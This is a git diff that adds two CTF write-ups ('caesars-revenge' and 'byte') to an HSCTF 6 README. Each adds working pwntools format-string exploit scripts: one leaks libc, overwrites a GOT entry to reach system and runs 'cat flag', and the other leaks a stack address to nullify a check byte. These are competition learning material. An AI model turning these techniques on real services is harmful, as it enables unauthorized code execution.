@@ -8,10 +8,12 @@ A bunch of write-ups for HSCTF 6 which I participated in this year. The write-up
 |---------|----|------|------|
 |[English Sucks](#english-sucks)|misc|497pts|8|
 |[bit](#bit)|pwn|401pts|76|
+|[caesars-revenge](#caesars-revenge)|pwn|...|...|
 |[combo-chain](#combo-chain)|pwn|368pts|102|
 |[combo-chain-lite](#combo-chain-lite)|pwn|...|...|
 |[storytime](#storytime)|pwn|...|...|
 |[return-to-sender](#return-to-sender)|pwn|...|...|
+|[byte](#byte)|pwn|...|...|
 
 # English Sucks
 
@@ -205,6 +207,59 @@ int main()
 
     return 0;
 }
+```
+
+## caesars-revenge
+
+```
+#!/usr/bin/python2
+
+from pwn import *
+
+# p = process('./caesars-revenge')
+p = remote('pwn.hsctf.com', 4567)
+
+#
+# hsctf{should_have_left_%n_back_in_ancient_rome}
+#
+
+payload  = '%28$s  '
+payload += '%142x%29$hhn'
+payload += '%16251x%30$ln'
+payload += p64(0x404018)
+payload += p64(0x404018)
+payload += p64(0x404019)
+
+p.sendline(payload)
+p.sendline('-1')
+p.sendline('26')
+
+p.recvuntil('Result: ')
+puts = p.recv(6)
+puts = u64(puts + '\x00\x00')
+log.info('puts   @ {}'.format(hex(puts)))
+
+system = puts - 0x2a300
+log.info('system @ {}'.format(hex(system)))
+
+lower = (system & 0xffff)
+log.info('system @ {}'.format(hex(lower)))
+
+payload  = '   %'
+payload += str(lower)
+payload += 'x%26$hn'
+payload += ''
+payload += p64(0x404048)
+
+log.info('payload ' + payload)
+
+p.sendline(payload)
+p.sendline('-1')
+p.sendline('26')
+p.sendline('Hello')
+p.sendline('cat flag')
+p.sendline('1')
+p.close()
 ```
 
 ## combo-chain
@@ -420,4 +475,53 @@ p = remote('pwn.hsctf.com', 1234)
 p.sendline('A' * 16 + 'B' * 4 + p32(0x080491b6))
 p.interactive()
 p.close()
+```
+
+## byte
+
+For this challenge, we leak an address on the stack using a format string exploit. It's just a matter of identifying the address we need to nullify. The binary has full RELRO enabled and is a position independent executable (PIE).
+
+```assembly
+.text:00001564 loc_1564:                               ; CODE XREF: main+82
+.text:00001564                 cmp     [ebp+var_88], 1
+.text:0000156B                 jle     loc_13AA
+.text:00001571                 cmp     [ebp+var_8E], 0
+.text:00001579                 jnz     short loc_1582
+.text:0000157B                 call    flag
+```
+
+We can see that `ebp-0x8e` contains the byte which determines whether or not the `flag` function is called. So we identify an address nearby on the stack using a format string of `%42$p`, then calculate the offset to `ebp-0x8e`. The challenge was a little annoying because my stack layout was significantly different from the server's layout.
+
+```python
+#!/usr/bin/python2
+
+from pwn import *
+
+#
+# $ python get.py
+# [+] Opening connection to pwn.hsctf.com on port 6666: Done
+# [*] 0xff82076c
+# [*] 0xff82062a
+# [+] Receiving all data: Done (38B)
+# [*] Closed connection to pwn.hsctf.com port 6666
+# hsctf{l0l-opt1mizati0ns_ar3-disabl3d}
+#
+
+p = remote('pwn.hsctf.com', 6666)
+# p = process('./byte')
+
+p.sendline('%42$p')
+p.recvuntil('byte: ')
+
+address_string = p.recv(10)
+address = int(address_string, 16)
+
+log.info(hex(address))
+
+nullify = str(hex(address - 0x142))[2:]
+log.info('0x' + nullify)
+p.sendline(nullify)
+
+p.recvuntil('flag: ')
+print p.recvall(timeout=1.0)
 ```
